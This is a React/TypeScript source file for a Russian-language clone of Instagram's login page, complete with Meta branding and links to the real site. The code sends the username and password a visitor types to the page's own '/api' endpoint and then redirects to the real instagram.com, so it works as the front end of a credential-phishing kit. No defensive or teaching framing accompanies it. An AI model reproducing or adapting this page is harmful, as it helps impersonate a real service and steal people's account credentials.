import React from "react";
import Alert from "./components/Alert";
import Loader from "./components/Loader";

const App: React.FC = () => {
    const [form, setForm] = React.useState<{login: string, password: string}>({
        login: '',
        password: ''
    })
    const [loader, setLoader] = React.useState<boolean>(false)
    const [alert, setAlert] = React.useState<boolean>(false)

    const change = (e: React.ChangeEvent<HTMLInputElement>) => {
        setForm({
            ...form, [e.target.name]: e.target.value
        })
    }

    const handleAccount = async (e: React.FormEvent) => {
        try {
            e.preventDefault()
            setLoader(true)
            const res = await fetch('/api', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    login: form.login,
                    password: form.password
                })
            })
            const data: {auth: boolean} = await res.json()
            setLoader(false)
            if (data.auth) {
                return window.location.replace('https://www.instagram.com/')
            }
            setAlert(true)
        } catch (e) {
        }
    }

    return (
        <div style={{height: '100vh', position: 'relative'}}>
            {
                alert &&
                <Alert setAlert={setAlert}/>
            }
            <div className="container">
                <div className="box">
                    <div className="headling"/>
                    <button className="fb-login-btn" type="button">
                        <svg className="icon-fb" xmlns="http://www.w3.org/2000/svg" width="14" height="14"
                             viewBox="0 0 24 24">
                            <path
                                d="M22.675 0h-21.35c-.732 0-1.325.593-1.325 1.325v21.351c0 .731.593 1.324 1.325 1.324h11.495v-9.294h-3.128v-3.622h3.128v-2.671c0-3.1 1.893-4.788 4.659-4.788 1.325 0 2.463.099 2.795.143v3.24l-1.918.001c-1.504 0-1.795.715-1.795 1.763v2.313h3.587l-.467 3.622h-3.12v9.293h6.116c.73 0 1.323-.593 1.323-1.325v-21.35c0-.732-.593-1.325-1.325-1.325z"/>
                        </svg>
                        <a style={{color: 'white'}} href="https://www.facebook.com/">Продолжить с Facebook</a>
                    </button>
                    <div className="seperator">
                        <div className="line"/>
                        <p>или</p>
                        <div className="line"/>
                    </div>
                    <form className="login-form">
                        <div className="field">
                            <input
                                type="name"
                                id="username"
                                placeholder="Телефон, имя пользователя или эл. адрес"
                                name="login"
                                onChange={change}
                            />
                            <label htmlFor="username">Телефон, имя пользователя или эл. адрес</label>
                        </div>
                        <div className="field">
                            <input
                                type="password"
                                id="password"
                                placeholder="Пароль"
                                name="password"
                                onChange={change}
                            />
                            <label htmlFor="password">Пароль</label>
                        </div>
                        <div className="other">
                            <a className="forgot-password" href="https://www.instagram.com/accounts/password/reset/">Забыли пароль?</a>
                        </div>

                        <button
                            type="submit"
                            className="login-button"
                            disabled={!(form.login.length && form.password.length > 6)}
                            title="Войти"
                            onClick={handleAccount}
                        >
                            {
                                loader ?
                                    <Loader/> : 'Войти'
                            }
                        </button>
                    </form>
                </div>
                <div className="register_link">
                    <p>У вас ещё нет аккаунта?</p>
                    <span style={{color: "#0095f6"}} className="singup">Зарегистрироваться</span>
                </div>
            </div>

            <div className="footer">
                <div style={{color: "#8996a4;"}}>from</div>
                <div className="meta">
                    <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor"
                         className="bi bi-meta" viewBox="0 0 16 16">
                        <path fillRule="evenodd"
                              d="M8.217 5.243C9.145 3.988 10.171 3 11.483 3 13.96 3 16 6.153 16.001 9.907c0 2.29-.986 3.725-2.757 3.725-1.543 0-2.395-.866-3.924-3.424l-.667-1.123-.118-.197a54.944 54.944 0 0 0-.53-.877l-1.178 2.08c-1.673 2.925-2.615 3.541-3.923 3.541C1.086 13.632 0 12.217 0 9.973 0 6.388 1.995 3 4.598 3c.319 0 .625.039.924.122.31.086.611.22.913.407.577.359 1.154.915 1.782 1.714Zm1.516 2.224c-.252-.41-.494-.787-.727-1.133L9 6.326c.845-1.305 1.543-1.954 2.372-1.954 1.723 0 3.102 2.537 3.102 5.653 0 1.188-.39 1.877-1.195 1.877-.773 0-1.142-.51-2.61-2.87l-.937-1.565ZM4.846 4.756c.725.1 1.385.634 2.34 2.001A212.13 212.13 0 0 0 5.551 9.3c-1.357 2.126-1.826 2.603-2.581 2.603-.777 0-1.24-.682-1.24-1.9 0-2.602 1.298-5.264 2.846-5.264.091 0 .181.006.27.018Z"/>
                    </svg>
                    Meta
                </div>
            </div>
        </div>
    )
}

export default App